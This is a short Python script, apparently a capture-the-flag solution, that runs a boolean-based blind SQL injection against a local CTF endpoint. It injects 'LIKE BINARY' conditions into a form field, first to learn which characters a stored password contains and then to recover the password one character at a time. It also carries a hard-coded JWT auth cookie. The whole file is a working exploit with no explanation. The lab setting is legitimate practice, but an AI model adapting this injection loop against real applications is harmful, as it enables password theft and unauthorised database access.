import time
import requests
import string


charset = ''.join(sorted(string.digits + string.ascii_letters))
neededchars = ''
password = ''

cookies = {'Auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImN0ZjExIiwiaWQiOiI1ZDc3NjBiYjhjNjcyMGE0MDVlNmM4MmMiLCJleHAiOjE1NzQwNzQ1MzksImlhdCI6MTU2ODg4NjkzOX0.GQdSnDfpty__H0WTp0GSlLQX0IwZiap95sHnwisTCiM'}

for c in charset:
    Data = {'text' : 'ctf12" and pw LIKE BINARY "%' + c + '%" #'}
    r = requests.post('http://localhost:8000/ctf/ctf11', data=Data, cookies=cookies)
    if('YAY' in r.text):
        neededchars = neededchars + c
        print(neededchars)
    # time.sleep(1)


print(neededchars)
for i in range(0,32):
    # time.sleep(1)
    for char in neededchars:
        Data = {'text' : 'ctf12" and pw LIKE BINARY "' + password + char + '%" #'}
        r = requests.post('http://localhost:8000/ctf/ctf11', data=Data, cookies=cookies)
        if 'YAY' in r.text :
            password = password + char
            print(password)
            break

print(password)

